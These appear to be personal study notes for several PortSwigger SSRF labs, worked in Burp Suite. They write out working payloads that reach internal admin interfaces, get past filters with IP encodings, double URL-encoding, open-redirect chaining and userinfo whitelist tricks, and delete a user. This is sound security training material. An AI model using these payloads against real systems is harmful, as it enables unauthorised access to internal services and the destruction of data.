 _____________
#ssrf
# Lab: Basic SSRF against the local server

- We're going to use **portswigger**, and using **burp suite** we're going to capture stock requests

![[Captura de pantalla (25) 1.png]]

- This is where we'll make the website send the malicious request "http://localhost/admin" ***It's important to always check which parameter is making the request because that's where the vulnerability is exploited***
   
![[Captura de pantalla (26).png]]

- We copy this request and send it via **Stock API** so that the server can make this request for us, which will be to delete the user Carlos.

![[Captura de pantalla 2026-03-26 004559.png]]

- We sent it, and we see that it was successfully deleted

![[Captura de pantalla 2026-03-26 004649.png]]

_______________


# Lab: Basic SSRF against another back-end system

- In this exercise, the same deletion process is performed, but in this case, it is necessary to check which specific IP address can be used to perform this action.

```
To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`
```


![[Captura de pantalla 2026-03-26 005658.png]]

- We captured the request and sent it to the **Intruder** to test which of the **255 IPs** is the correct one.

![[Captura de pantalla 2026-03-26 010249.png]]
    We corrected the request to match the information we need

![[Captura de pantalla 2026-03-26 010320.png]]
      We set up the intruder with the range 1-255 (which corresponds to the number of ports)

![[Captura de pantalla 2026-03-26 012516.png]]

- We found that one with a **Status code 200** 

![[Captura de pantalla 2026-03-26 014334.png]]

- If we go back to the ***Repeater*** and try with **205** and we send the request se will see it gives us the info we need so we just to re-send the request with the **delete instruction** 

![[Pasted image 20260326014651.png]]

- and it is successful

![[Captura de pantalla 2026-03-26 014811.png]]

___________________________


#  Lab: Blind SSRF with out-of-band detection

- In this exercise We are facing a **safety measure** designed to avoid **SSRF attacks** let's see it

![[Captura de pantalla 2026-03-26 025253.png]]

- taking this into account we to work in the various ways how the **IP/Localhost** is represented and its taken by the **WAF** and if is accepted, let's see some tries:


`option 1`

```
http://127.0.0.1/admin
```
     It did not work

`
`option 2 - Hex`

```
http://0x7f000001/admin
```
     It did not work

```
http://0x7f000001/admi
```
     If we check with a route it does not exist, give us back a 500 Code status which is a clue, something is broken but we need to have better aim. We can deduce Victim system is working to find this route, it's a good new. Localhost is processing orders

`option 3`

```
http://127.1/admin
```
     Bad request

```
http://127.1/admi
```
     respond with a 404, it confirms system victims is processing orders, let's double URL-encode a character and see if works 

```
http://127.1/%2561dmin
```
      It worked, now we just need to request the delete route

```
http://127.1/%2561dmin/delete?username=carlos
```

![[Captura de pantalla 2026-03-26 032122.png]]

_______________________

# Lab: SSRF with filter bypass via open redirection vulnerability

- In this exercise we need to find a **open redirect** which is our attack vector.

![[Captura de pantalla 2026-03-26 041454.png]]
     As the exercise said, we need to find a **open redirect** and use it as vector attack

![[Captura de pantalla 2026-03-26 041640.png]]
     We capture the open **redirect request** and we see the **path=/**  which is use to redirect, Lets prove it on a **HTTP** request

![[Captura de pantalla 2026-03-26 043235.png]]
      It worked when we sent the 

- Seeing how the **redirection request** works, now we need to understand how use it against it self

![[Captura de pantalla 2026-03-26 043651.png]]
     Here we got the **stock request** captured, we see this one only accepts routes

- Now add the route with the **open redirect** to the StockApi to use it as **attack vector**

```
/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
```

![[Captura de pantalla 2026-03-26 185706.png]]

- As the request worked as we expected now we just need to delete the user ***Carlos***

```
/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```

![[Captura de pantalla 2026-03-26 190249.png]]

_____________________

# Lab: SSRF with whitelist-based input filter

- First we capture the **stock request** and try the next route 

```
http://localhost/admin
```

![[Captura de pantalla 2026-03-26 232641.png]]
     We see the page only accepts routes from a specific place 

```
stock.weliketoshop.net
```

- knowing this now we will opt to **bypass** this **whitelist filters** through the **login method** used in **HTTP requests**

```
http://user:password@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```
     First let's see if it works. which means that an SSRF attack can be done

![[Captura de pantalla 2026-03-26 234426.png]]

- It worked properly, with this now let's target **localhost** and also use the ***hash change tool*** use by certain web sites.

```
http://localhost%2523@stock.weliketoshop.net:8080/
```
     %2523 -> result of a double URL-encode of the #

![[Captura de pantalla 2026-03-26 235326.png]]
     In this moment we are already enumerating information via  **SSRF attack**, but let's escalate the attack till delete the user **carlos**

![[Captura de pantalla 2026-03-26 235741.png]]
     We check the route with the **/admin** and we see the **delete route**, let's add it our payload

```
http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
```

![[Captura de pantalla 2026-03-26 235830 1.png]]
     We send it and we see a **302 status code (redirection)**, it worked successfully

![[Captura de pantalla 2026-03-26 235854.png]]


     This exercise taught us how a misconfigured whitelist filter allows for SSRF, which allow us to list information and make requests due to insufficient input sanitization